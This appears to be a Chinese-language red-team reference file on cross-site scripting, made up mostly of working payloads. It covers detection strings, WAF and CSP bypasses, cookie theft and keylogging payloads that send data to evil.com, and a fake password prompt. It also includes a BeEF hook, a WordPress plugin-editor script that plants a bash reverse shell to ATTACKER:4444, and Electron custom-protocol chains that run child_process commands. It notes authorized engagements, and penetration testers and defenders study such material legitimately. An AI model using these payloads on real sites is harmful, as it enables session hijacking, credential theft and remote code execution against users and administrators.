# XSS（反射 / 存储 / DOM / CSP / XSS→RCE）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---


## XSS 跨站脚本实战参考
- CORS/缓存投毒等低价值项的利用链门槛 → `low-value.md`
- WAF 绕过 Payload 编码 → `waf-bypass.md`

> 分类: 检测 → 反射型 → 存储型 → DOM型 → Cookie窃取 → BeEF → WAF绕过 → CSP绕过

> **last_updated**: 2026-06-04 | **tested_against**: Chrome 120+, Firefox 120+, CSP Level 3
---

## 1. 快速检测

### 1.1 检测 Payload

```html
<!-- 基础弹窗 (最常用) -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 短版 -->
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- 无script标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 最短 -->
<svg/onload=alert(1)>
```

### 1.2 按输出点选择 Payload

```
输入在 HTML标签之间  → <script>alert(1)</script>
输入在 <input> 属性中 → "><script>alert(1)</script>
输入在 <script> JS中  → '</script><script>alert(1)</script> 或 -alert(1)-
输入在 <a href> 中     → javascript:alert(1)
输入在 URL 参数中      → 闭合当前属性或标签
输入在 CSS 中          → expression/url/@import 等 CSS注入
输入在 JSON 响应中     → '</script>闭合 + HTML注入
输入在 Error Page      → %0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
```

---

## 2. 反射型 XSS

### 2.1 常见注入点

```
搜索框:       ?q=<script>alert(1)</script>
错误消息:     ?error=<script>alert(1)</script>
重定向参数:   ?redirect=javascript:alert(1)
回调参数:     ?callback=<script>alert(1)</script>
模板变量:     ?name={{7*7}}
```

### 2.2 绕过基础过滤

```html
<!-- 1. 大小写混合 -->
<ScRiPt>alert(1)</sCrIpT>

<!-- 2. 双写绕过 -->
<scr<script>ipt>alert(1)</script>

<!-- 3. 替换标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

<!-- 4. 事件处理器 -->
<svg/onload=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)></video>

<!-- 5. 不带括号 (location=name) -->
<script>throw onerror=eval,0,';alert\x281\x29'</script>
```

---

## 3. 存储型 XSS

### 3.1 典型注入位置

```
留言板/评论区:   <p>你的评论</p> → <p><script>alert(1)</script></p>
用户资料页:     用户名/签名/头像URL → 
富文本编辑器:   绕过XSS过滤器 (DOMPurify等)
文件上传:       上传HTML/SVG文件
```

### 3.2 绕过长度限制

```html
<!-- 多个注入点拼接 -->
<!-- 评论1: --> <script>a="
<!-- 评论2: --> alert(1)
<!-- 评论3: --> "</script>

<!-- 组合后: --> <script>a="alert(1)"</script> (错误) 

<!-- 更好: JS变量赋值利用 -->
<!-- name字段(限10字): --> ";a=1;//
<!-- bio字段(限50字): --> if(a){new Image().src='http://evil.com/?c='+document.cookie}
```

---

## 4. DOM 型 XSS

### 4.1 常见 Sink

```javascript
// Source → Sink 模式
document.write(location.hash)         // #<img src=x onerror=alert(1)>
element.innerHTML = location.search   // ?x=<img src=x onerror=alert(1)>
eval(location.hash.slice(1))          // #alert(1)
setTimeout(location.hash.slice(1))    // #alert(1)

// jQuery
$('#div').html(location.hash)         // #<img src=x onerror=alert(1)>
$(location.hash)                      // jQuery selector injection
$.getScript(location.hash.slice(1))

// AngularJS
{{constructor.constructor('alert(1)')()}}
```

### 4.2 DOM XSS 检测

```bash
# 用DOM Invader (Burp内置) 或手动检查:
# 1. 找 Source: location.* / document.referrer / window.name / postMessage
# 2. 找 Sink: innerHTML / document.write / eval / location.href
# 3. 追踪 Source→Sink 路径
```

---

## 5. Cookie/凭据窃取

### 5.1 Cookie窃取 Payload

```html
<!-- HTTP -->
<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
<script>fetch('http://evil.com/steal?c='+document.cookie)</script>

<!-- 无CORS用 -->
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

<!-- 密钥记录 -->
<script>
document.onkeypress=function(e){
  new Image().src='http://evil.com/k?k='+e.key
}
</script>
```

### 5.2 钓鱼弹窗

```html
<!-- 伪造登录框 -->
<script>
var p=prompt('Session expired, re-enter password:');
new Image().src='http://evil.com/p?p='+p;
</script>
```

---

## 6. BeEF 用法

```bash
# Hook js 注入:
<script src="http://<beef-server>:3000/hook.js"></script>

# BeEF 命令:
# beef-xss  # 启动
# → 管理界面: http://127.0.0.1:3000/ui/panel

# 利用模块:
# - 浏览器指纹
# - 内网扫描 (port scan)
# - 摄像头/麦克风 (需权限)
# - 社会工程弹窗
# - 配合Metasploit
```

---

## 7. WAF/过滤器绕过

### 7.1 编码绕过

```html
<!-- HTML实体 -->
&lt;script&gt;alert(1)&lt;/script&gt;  → 在某些位置仍生效

<!-- URL编码 -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Unicode编码 (JS字符串) -->
<script>alert(1)</script>

<!-- Base64 (eval) -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- JSFuck (仅6个字符写JS) -->
<script>([][(![]+[])[+[]]+...])</script>
```

### 7.2 特殊标签/协议

```html
<!-- data: URI -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- vbscript: (IE only) -->
<a href="vbscript:msgbox(1)">click</a>

<!-- 无交互 -->
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>

<!-- 使用HTML5新标签 -->
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<ruby><rt onfinish=alert(1)>

<!-- Mutation XSS (innerHTML) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### 7.3 表情包/emoji 绕过

```
# 部分WAF对含emoji或特殊Unicode的payload处理异常
<img src=x onerror=alert😀(1)>  → 部分过滤失效
```

### 7.4 仍被拦截？

加载 `waf-bypass.md`，按 §11 分层流程逐层打。优先级: 编码变形 → 事件/标签切换 → HPP → 分块传输 → Content-Type 切换。

---

## 8. CSP (Content-Security-Policy) 绕过

### 8.1 检查CSP

```bash
curl -I https://target.com | grep -i content-security-policy
# 或浏览器 F12 → Console → 看错误消息
```

### 8.2 常见CSP绕过

```bash
# 1. unsafe-inline → script-src 'unsafe-inline' → 直接<script>
# 2. unsafe-eval → script-src 'unsafe-eval' → eval()可用
# 3. 通配符域名 → *.googleapis.com → 如果托管了Angular JSONP等
# 4. data: → img-src data: → <img src="data:text/html,<script>alert(1)</script>">
# 5. 白名单CDN → cdnjs/ajax.googleapis.com → JSONP端点/angular.js

# JSONP 劫持 (script-src 白名单了可JSONP的域名)
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js?callback=alert(1)"></script>

# 利用 Angular 库 (angularjs.org 在白名单)
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">Click</div>
</div>
```

---

## 9. XSS 漏洞链 — 到 RCE

```
存储型 XSS → 管理员Cookie → 登入后台
→ 后台有文件上传 → WebShell
→ 后台有模板编辑 → 写PHP代码 → RCE
→ 后台有数据库管理 → SQL命令执行 → RCE
→ 后台有系统命令执行 → 直接RCE

反射型 XSS → 钓鱼链接 → 管理员触发 → 同存储型利用链
```

---
## 相关参考
- CORS/缓存投毒等低价值项的利用链门槛 → `low-value.md`
- WAF 绕过 Payload 编码 → `waf-bypass.md`

*参考: OWASP XSS Cheat Sheet + PortSwigger XSS + PayloadAllTheThings*


---

## 补充与进阶


---

## XSS 测试手册

---

## XSS 类型判断

| 类型 | 特征 |
|------|------|
| 存储型 | payload 存入数据库，他人访问触发 |
| 反射型 | payload 在 URL 参数中，需诱导点击 |
| DOM 型 | 纯前端处理，不经过服务端 |

打穿了按 `../hw-rules/report-format` 定级，不按存储/反射/DOM 抬级。

---

---

## 基础 Payload

```html
<!-- 基础验证 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 无 script 标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>

<!-- 属性注入（闭合属性）-->
" onmouseover="alert(1)
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

---

---

## WAF 绕过 Payload

```html
<!-- 大小写 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG 护网=X ONERROR=alert(1)>

<!-- 事件多样化 -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 冷门自动事件：onerror/onload 被剥时用。未知标签也能挂。内联作用域里 cookie 就是 document.cookie -->
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<!-- 未知标签被剥时换 input；只要 content-visibility:auto，不必 display:block -->
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
<!-- Popover：style 被剥时换这条。要点一下按钮。内联 URL 就是 document.URL -->
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>

<!-- 编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="javascript:\u0061lert(1)">click</a>

<!-- 注释分割 -->
<scr<!--注释-->ipt>alert(1)</scr<!--注释-->ipt>

<!-- 使用反引号 -->
<img src=`x` onerror=alert(1)>
```

---

---

## DOM XSS 查找

```javascript
// 搜索危险接收点
search_in_sources("innerHTML")
search_in_sources("document.write")
search_in_sources("eval(")
search_in_sources("location.hash")
search_in_sources("location.search")

// 常见 DOM XSS 源
document.location.hash    // #后面的内容
document.location.search  // ?后面的参数
document.referrer
window.name
postMessage
```

---

---

## XSS 证明方式（护网要求）

对于 护网提交，**禁止使用 alert(1)** 证明危害，应使用：

```javascript
// 证明能读取 Cookie
alert(document.cookie)
// 内联事件里可写成 a=alert,a(cookie) 或 a=alert,a(URL)（作用域就是 document.cookie / document.URL）

// 证明能读取 token（localStorage）
alert(localStorage.getItem('token') || sessionStorage.getItem('token'))

// 证明 domain（证明不是 self-xss）
alert(document.domain)
```

---

---

### 冷门事件 + 内联作用域（onerror/onload 被拦时）

标签名随意（`c2xh` / `c2xl` 这种未知元素也能挂）。内联事件的作用域摸得到 `document`：`cookie` = `document.cookie`，`URL` = `document.URL`。拦 `document` / `alert(1)` 时用 `a=alert,a(cookie)` 或 `a=alert,a(URL)`。

不用点（`style` 还在时）：

```html
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
```

未知标签被剥就换 `input` / `p`（或其它白名单标签）。`input` 上往往只要 `content-visibility:auto`，不必再写 `display:block`。`alert(1)` 能过就先过；拦了再换 `a=alert,a(cookie)`。

富文本 / BBCode / wiki 若把 `[p]`、`[[p]]`、`[div]` 转成对应 HTML 且属性原样带过去，直接挂在允许的标签上：

```
[[p oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto][/p]]
[div onmousemove=eval.call`${'al\x65rt(1)'}` style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999][/div]
```

`onmousemove` 要点/滑鼠标；`position:fixed` 铺满是为了鼠标一动就中。`eval.call\`...\`` 是标签模板调 `eval`；`\x65` 是 `e`，躲开字面 `alert`。自动事件能过就别用这条。

`onerror`/`onload` 被剥、自动事件也不走时，换指针事件 + 把元素撑大，鼠标一进就中（URL 编码常见）：

```
<svg%20id%3dmySvg%20onpointerenter%3da=alert,a(cookie)%20width%3d10000%20height%3d10000></svg>%2F%2F
```

解码即 `<svg id=mySvg onpointerenter=a=alert,a(cookie) width=10000 height=10000></svg>//`。末尾 `//` 注释掉注入点后面的残留。假点：没划进这张超大 svg；标签/事件被剥。

页面已经引入 Layui / animate.css 这类现成动画时，挂库里的 class，用 `onanimationstart` 自动开火，不用自己写 `@keyframes`：

```
[div class=layui-anim-up onanimationstart=javascript:alert(1)][/div]
```

事件处理里写 `javascript:alert(1)` 时，`javascript:` 是 JS 标签（label），后面的 `alert(1)` 照样跑，不是 URL 协议。假点：页面没有这段 CSS；class / 事件被剥；动画没播。

假点：只换标签名、属性被剥；转出来是纯文本；没滑鼠标；`style` 被剥只剩小块要精确悬停；CSP 禁 `eval`。前面的「Life：face」这类只是正文，不是 payload 的一部分。

`style` / `content-visibility` 被剥时换 Popover，要点一下按钮。`popovertarget` 对上 `id`，`onbeforetoggle` 在弹出前开火：

```html
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>
```

Chrome / Edge 优先。Firefox、Safari 这两个 API 经常不响，换别的事件，这条不算死。Popover 那条没点按钮不算打穿。

---

## 8. XSS → RCE / 自定义协议（手法索引有指针）

---

### XSS → RCE（特权上下文，和上面偷 Cookie 是同一条链的升级）

存储/反射 XSS 打穿之后，或 Electron 自己把外站页拉进特权窗之后，问的是：**这段 JS 跑在谁的进程里**。网页里只是会话；落到能写插件、能调本机桥的地方才是 RCE。下面几条是同一类，不是互斥。

**网页后台（WordPress 等）**：管理员会话 + 能改插件/主题的编辑器。Hello Dolly 只是现成文件，别的可写入口一样打。

```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

**桌面客户端（CEF / Electron / 企业 Git GUI）**：有 node 桥 / `nodeIntegration` / `enableRemoteModule` / 暴露的 `Buffer`·`require`·`child_process`，页面里的 JS 就在本机进程里跑。payload 按现场选（自动跳转、外链、事件、远程页），**不要死抄某一种 gadget**。沙箱死了 → 当普通存储 XSS 继续打网页，不宣布这条死。

投递 1（存储 XSS）：README、议题、评论里存的 HTML，客户端当网页渲。组员/邀请接口若只认数字 `user_id`，递增拉人即可（就是 `auth-idor.md` 里已有的顺序 ID + 批量写）。对方克隆列表若不隔离，你的仓会出现在他客户端里，打开 README 即触发。拉人本身不是洞的主体，主体仍是客户端把 HTML 渲成了特权 XSS。

---

### 自定义协议 → RCE（手法索引有指针）

投递 2（自定义协议，不必先有存储 XSS）：客户端注册了自己的 scheme。macOS 看 `Info.plist` 的 `CFBundleURLSchemes`，Windows 看安装时写的协议，包里的 JS 搜 `setAsDefaultProtocolClient` / `open-url` / `second-instance`。协议参数里出现 `url`、`urlType`、`open`、`openUrl`、`webview`，就试把外站地址塞进去。两种常见形态（字段名跟现场走，不要死抄）：

- JSON：`scheme://app/open?params={"url":"http://attacker","urlType":1}`
- 扁平：`scheme://openUrl?url=http://attacker/exp.html`

浏览器地址栏或任意 `href` 打开，系统会问「要打开该应用吗」——对方点一次就算合理交互，不需要中间人。

攻击页先探桥，再弹计算器。不要因为 Electron 18+ 或没有 `remote` 就停。顺序：`typeof process` → `typeof require`（`require.toString()` 含 `native` 才当真）→ `window.require` → 没有再看预加载桥 / `window.electron.ipcRenderer`。`require` 能直接 `child_process` 就用它；只有老窗口才走：

```
const {remote} = require('electron');
remote.require('child_process').exec('open -a Calculator');
```

Windows 把命令换成 `calc`。预加载只露了 `ipcRenderer`、调不了命令 → 这条桥没打穿，别写成 RCE。

算成：本机弹出计算器 / 执行了你指定的无害命令。只在浏览器 alert、客户端不渲、只弹「打开应用」但不加载外站、或跳了但没执行 → 停在调起/存储 XSS，别写成 RCE。协议只开自家域、`require` 和 `remote` 都没有 → 这条投递到此为止，改打投递 1 或网页面。

---

## csp-bypass-test（几乎不交）

> 单独绕 CSP 不交。XSS 打穿走 `xss.md`（含 JSONP/CDN/base-uri 开场）。